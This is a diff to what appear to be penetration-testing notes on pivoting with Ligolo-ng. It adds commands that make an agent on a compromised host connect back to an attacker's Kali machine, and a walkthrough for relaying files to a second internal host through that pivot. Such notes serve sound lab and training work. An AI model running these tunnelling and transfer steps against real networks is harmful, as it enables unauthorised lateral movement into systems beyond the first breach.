@@ -60,8 +60,11 @@ sudo chmod +x proxy
 
 On the Pivot target, use the agent file to connect to our running proxy:
 ```shell
+# On Linux
 chmod +x agent
 ./agent --connect <kali_ip>:11601 -ignore-cert
+# On Windows PowerShell
+./agent.exe --connect <kali_ip>:11601 -ignore-cert
 ```
 
 Now enter the following on the Ligolo-Ng console:
@@ -75,4 +78,18 @@ ligolo-ng » session
 # Now we are able to access the network 172.16.150.0/24
 ```
 
+## File Transfers Example - Single Pivot
+In this example we got access into the Host B 172.16.150.20 (We are inside its CLI).
+We previously set up our Pivot Host A, in this case 172.16.150.10.
+Now we want to move a file from Kali (192.168.45.200) to Host B (172.16.150.20) through our Pivot Host A (172.16.150.10):
+```shell
+# Create new listener - Port 1236 on Kali will be the Port 9003 on the Pivot Target
+# Enter the following on the running active Kali Ligolo-Ng session
+listener_add --addr 0.0.0.0:1236 --to 0.0.0.0:9003
+# Start Python server on Kali using Port 1236
+python3 -m http.server 1236
+# From the Host B CLI, access Python server through Port 9003 at the Pivot Host
+wget http://172.16.150.10:9003/test.txt
+
+# Establishing Second Pivot (Double Pivot)
 
